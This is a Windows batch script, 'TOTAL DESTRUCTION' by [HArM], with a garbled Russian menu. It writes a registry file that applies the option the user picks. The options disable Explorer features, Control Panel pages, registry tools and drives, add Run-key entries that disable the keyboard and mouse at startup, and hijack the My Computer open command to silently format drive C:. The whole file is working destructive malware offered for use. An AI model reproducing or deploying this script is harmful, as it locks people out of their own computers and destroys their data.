@echo off
cls
echo Welcome to TOTAL DESTRUCTION version 1.0 by [HArM]
echo Web: http://hackzzz.narod.ru
echo Email: coolharm@chat.ru
echo.
echo ==========================================================================
pause
set total=C:\total.reg
goto 001
:000
cls

echo �������� ࠡ��� �ணࠬ��? Y/N
choice /c:yn /n
if errorlevel 2 goto 001
goto end

:001
cls
echo ������ �㪢� ᮮ⢥�������� ��࠭���� ����⢨�!
echo ==========================================================================
echo ����� ���� "�����襭�� ࠡ���"  (A)  ����� ���� "�믮�����"          (B)
echo ����� ���� "��ࠢ��"            (C)  ����� ���� "����"              (D)
echo ����� ���� "����ன��"          (E)  ����� ���� "���㬥���"          (F)
echo ����� ���� "�ਭ���"           (G)  ����� ���� "�����襭�� ᥠ��"  (H)
echo ����� ���� "���࠭���"          (I)  ����� ����稩 �⮫              (J)
echo ����� ���� "����"               (K)  ����� ���� "��⥢�� ���㦥���"  (L) 
echo ����� ���� "������ �����"       (M)  ����� ���� "�������� �ਭ��"   (N)
echo ����� ���� "������� �ਭ��"    (O)  ����� "��ᯫ��" �� ���.�ࠢ.   (P)
echo ����� "����" �� ���.�ࠢ.      (Q)  ����� "��஫�" �� ���.�ࠢ.    (R)
echo ����� "��ଫ����" �� "��ᯫ��" (S)  ����� "���"  �� "��ᯫ��"       (T)
echo ����� "���⠢��"  �� "��ᯫ��"  (U)  ����� "����ன��"  �� "��ᯫ��" (V)
echo ����� "��䨫� ���짮��⥫�"    (W)  ����� "����� ��஫��"           (X)
echo ����� "���ன�⢠" �� "���⥬�" (Y)  ����� "�������� ��⥬�"        (Z)
echo ����� "����㠫쭠� ������"      (0)  ����� "�����䨪���" �� "����" (1)
echo ����� "��ࠢ����� ����㯮�"     (2)  ������ �� ��᪨                 (3)
echo ������� ��������� ॥���      (4)  ��ࠢ��஢��� ᡮ� ��������!  (5)
echo �������� ���⠬� ������ ���     (6)  �⪫���� ����������             (7)
echo �⪫���� ����                   (8)  ��䨪�஢��� �६� �� 99� 99��� (9)
echo     ��ଠ�஢��� ������� �� ����⨨ �� "��� ��������" (�)

choice /c:abcdefghijklmnopqrstuvwxyz0123456789` /n
if errorlevel 37 goto 01
if errorlevel 36 goto 9
if errorlevel 35 goto 8
if errorlevel 34 goto 7
if errorlevel 33 goto 6
if errorlevel 32 goto 5
if errorlevel 31 goto 4
if errorlevel 30 goto 3
if errorlevel 29 goto 2
if errorlevel 28 goto 1
if errorlevel 27 goto 0
if errorlevel 26 goto z
if errorlevel 25 goto y
if errorlevel 24 goto x
if errorlevel 23 goto w
if errorlevel 22 goto v
if errorlevel 21 goto u
if errorlevel 20 goto t
if errorlevel 19 goto s
if errorlevel 18 goto r
if errorlevel 17 goto q
if errorlevel 16 goto p
if errorlevel 15 goto o
if errorlevel 14 goto n
if errorlevel 13 goto m
if errorlevel 12 goto l
if errorlevel 11 goto k
if errorlevel 10 goto j
if errorlevel 9 goto i
if errorlevel 8 goto h
if errorlevel 7 goto g
if errorlevel 6 goto f
if errorlevel 5 goto e
if errorlevel 4 goto d
if errorlevel 3 goto c
if errorlevel 2 goto b

@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoCLose"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:b
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoRun"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:c
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoHelp"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:d
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoFind"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:e
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoSetFolders"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:f
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoRecentDocsMenu"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:g
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoPrinters"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:h
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoLogOff"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:i
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoFavoritesMenu"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:j
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoDesktop"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:k
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoFileMenu"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:l
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoNetHood"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:m
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoSetTaskbar"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:n
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoAddPrinter"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:o
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoDeletePrinter"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:p
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoDispCPL"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:q
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoNetSetup"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:r
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoSecCPL"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:s
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoDispAppearancePage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:t
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoDispBackgroundPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:u
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoDispScrSavPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:v
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoDispSettingsPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:w
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoProfilePage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:x
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoPwdPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:y
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoConfigPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:z
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoFileSysPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:0
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "NoVirtMemPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:1
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network]>>%total%
@echo "NoNetSetupIDPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:2
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network]>>%total%
@echo "NoNetSetupSecurityPage"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:3
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%total%
@echo "NoDrives"=hex:67108863>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:4
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%total%
@echo "DisableRegistryTools"=dword:00000001>>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:5
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%total%
@echo "total"="rundll32 user,disableoemlayer">>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:6
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%total%
@echo "total"="rundll32 user,swapmousebutton">>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:7
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%total%
@echo "total"="rundll32 keyboard,disable">>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:8
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%total%
@echo "total"="rundll32 mouse,disable">>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:9
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_CURRENT_USER\Control Panel\International]>>%total%
@echo "sTimeFormat"="99:99">>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:01
@echo REGEDIT4>>%total%
@echo.>>%total%
@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open]>>%total%
@echo.>>%total%
@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open\Command]>>%total%
@echo @="command.com /c format C: /q /u">>%total%
echo ��⮢�! ������ ���� ������ ��� �த�������...
@pause>nul
goto 000

:end
cls
